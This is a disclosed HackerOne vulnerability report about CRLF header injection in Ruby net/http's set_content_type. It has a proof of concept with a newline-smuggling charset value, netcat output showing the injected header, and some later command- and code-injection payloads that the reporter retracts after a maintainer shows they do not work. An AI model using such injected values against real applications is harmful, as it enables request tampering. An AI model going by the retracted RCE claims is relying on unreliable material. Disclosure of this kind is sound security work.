---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/crlf-injection
  - env/web
  - stack/ruby
substate: "informative"
weakness: "CRLF Injection"
enriched: true
body: true
date: 2022-02-04
submitted: 2021-04-19T09:25:40.010Z
bounty_usd: null
votes: 9
cve: []
program: "[[programs/ruby|Ruby]]"
reporter: "sighook"
source: "https://hackerone.com/reports/1168205"
title: "'net/http': HTTP Header Injection in the set_content_type method"
---
# 'net/http': HTTP Header Injection in the set_content_type method

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 9 | **Program:** Ruby | **Disclosed:** 2022-02-04

- Report: [https://hackerone.com/reports/1168205](https://hackerone.com/reports/1168205)
- CWE: CRLF Injection
- Submitted: 2021-04-19T09:25:40.010Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

The set\_content\_type's parameter is not filtered to prevent the injection from altering the entire request.

The vulnerable code:
```ruby
  def set_content_type(type, params = {})
    @header['content-type'] = [type + params.map{|k,v|"; #{k}=#{v}"}.join('')]
  end
```

# PoC

1.
```ruby
require 'net/http'

uri = URI('http://127.0.0.1:8080')
req = Net::HTTP::Post.new(uri)
req.set_content_type('text/html', "charset" => "iso-8859-1\nHeader:Inject")

resp = Net::HTTP.start(uri.hostname, uri.port) do |http|
  http.request(req)
end
```

2.
```
$ nc -lvp 8080
Listening on 0.0.0.0 8080
Connection received on localhost 57620
POST / HTTP/1.1
Accept-Encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3
Accept: */*
User-Agent: Ruby
Host: 127.0.0.1:8080
Content-Type: text/html; charset=iso-8859-1
Header:Inject # <<<<<<<<
Content-Length: 0
```

I set the same severity as [CVE-2020-26116](https://nvd.nist.gov/vuln/detail/CVE-2020-26116) has.

## Impact

In web applications a CRLF injection can have severe impacts, depending on what the application does with single items. Impacts can range from information disclosure to code execution, a direct impact web application security vulnerability.

## Timeline

- **Report Filed**
- **2021-04-19** @mame: Thank you. @naruse , what do you think?
- **Report Triaged**
- **2021-04-29** @sighook: In applications involving `set_content_type`, it is possible to escalate the vulnerability to HTTP Request Smuggling / HTTP Desync attacks.
- **2021-04-29** @sighook: Forget it, I didn't wake up) Sorry.
- **2021-07-16** @sighook: In addition to checking for `[\r\n]` it is necessary to sanitize `#{k}`/`#{v}` interpolation. Otherwise, it may lead to RCE:

a) OS Command injection
```ruby
req.set_content_type('text/html',
"charset" => "iso-8859-1\nHeader:Inject\n#{`touch example.rb`}")
```

b) Code injection
```ruby
req.set_content_type('text/html',
"charset" => "iso-8859-1\nHeader:Inject\n#{require 'fileutils';FileUtils.touch 'example'}")
```
- **2021-07-16** @nobu: When/where do you think the generated header string will be `eval`ed as Ruby code?
- **2021-07-16** @sighook: hi @nobu,

`net/http` is widely used in server-side software. For example, it is often used  for API / Callback Requests. An attacker could use this flaw to inject additional headers / command / code in a ruby application that allowed user provided header names or values.

For example, a less dangerous vulnerability in the Python project (only CRLF injection) has been assigned cve-2016-5699:

- https://access.redhat.com/security/cve/cve-2016-5699
- https://hackerone.com/reports/165102

The vulnerability essence is the same: one to one.
- **2021-07-18** @nobu: I mean that interpolated fragments are just strings and a part looks like a string interpolation is not a string interpolation.
- **2021-07-19** @sighook: OMG, I realized how badly I had messed up with 'interpolation issue'  O_O
"Shame, shame, I know your name...". Excuse me, please.

@nobu
Well, only CVE-2016-5699-like "Header Injection" remains.
- **2021-08-21** @sighook: any updates?
- **2021-10-19** @sighook: Forgive me for bothering you, just considering that the report is 6 months old and its status is "triaged", I remind you about it so that it does not get lost.
- **2021-10-19** @nobu: **Who** inserts that string to **what** headers?
Do you mean that an attacker can build malicious requests using net/http?
- **2021-10-19** @sighook: @nobu

If the server-side application relies on this flow to add the additional header to the request that it makes based on data provided/controlled by an attacker, that allows to attacker to inject additional headers/command/code into the request.

For example, we have an app which makes API-callback to the client.  It relies on the client's content-type request value, and add that value to the headers of the request which will be sent back to the client callback server. Since the application uses a vulnerable mechanism for this, an attacker can inject into the content-type value additional headers, make request smuggling, attack memcached/redis, and so on that follows from the header injection.
- **Report Title Updated**
- **Cve Id Added**
- **2021-10-21** @nobu: Leaving the server-side, I’m curious about the client-side.
CVE-2016-5699 is "via CRLF sequences in a URL", is there any way to set the content type from a URL?
- **Report Informative**
- **Agreed On Going Public**
- **2021-12-21** @sighook: Let's disclose it?
- **2021-12-26** @sighook: any updates?
- **2022-02-04** @sighook: Let's disclose it?
- **Agreed On Going Public**
- **Report Became Public**
